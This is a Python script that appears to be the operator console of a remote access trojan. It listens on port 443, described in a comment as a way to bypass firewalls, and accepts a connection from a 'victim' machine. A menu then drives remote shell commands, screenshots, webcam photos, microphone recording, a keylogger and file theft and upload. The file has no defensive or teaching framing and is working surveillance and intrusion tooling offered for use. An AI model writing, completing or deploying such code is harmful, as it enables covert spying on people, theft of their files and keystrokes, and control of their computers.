import socket
import os

def connect():
    host = ""
    port = 443  # ← Using 443 to bypass firewalls
    s = socket.socket()
    s.bind((host, port))
    print(f"[+] Listening on port {port} (Make sure Azure inbound rule allows 443)")
    s.listen(1)
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    return conn, s

def receive_file(conn):
    filename = input("    Save as: ")
    with open(filename, "wb") as f:
        while True:
            data = conn.recv(1024)
            if b"Sended" in data or b"FILE_SENT" in data:
                f.write(data.replace(b"Sended", b"").replace(b"FILE_SENT", b""))
                break
            f.write(data)
    print(f"[+] Saved as {filename}")

def send_file(conn):
    filepath = input("    File to upload: ")
    if os.path.exists(filepath):
        conn.send(f"upload {os.path.basename(filepath)}".encode())
        with open(filepath, "rb") as f:
            while chunk := f.read(1024):
                conn.sendall(chunk)
            conn.sendall(b"DONE")
        print(conn.recv(1024).decode())
    else:
        print("File not found")

def main():
    conn, s = connect()
    shell_type = input("Shell type (CMD / PS): ").upper()
    conn.sendall(shell_type.encode())

    print("\nCommands:")
    print("  ss <name>      → screenshot")
    print("  webcam <name>  → webcam photo")
    print("  download <file>→ download file")
    print("  upload         → upload file")
    print("  sysinfo        → victim info")
    print("  keylog         → start keylogger")
    print("  mic            → record 10 sec audio")
    print("  exit           → close\n")

    while True:
        try:
            cmd = input(f"{shell_type}> ")
            if cmd == "exit":
                conn.close(); s.close(); break
            if not cmd: continue

            conn.sendall(cmd.encode())

            if cmd.startswith("ss ") or cmd.startswith("webcam ") or cmd == "mic":
                receive_file(conn)
            elif cmd.startswith("download "):
                filename = cmd[9:]
                conn.sendall(filename.encode())
                receive_file(conn)
            elif cmd == "upload":
                send_file(conn)
            else:
                response = conn.recv(32000).decode("utf-8", errors="ignore")
                print(response, end="")

        except KeyboardInterrupt:
            print("\nClosing...")
            break
        except:
            print("Victim offline")
            break

if __name__ == "__main__":
    main()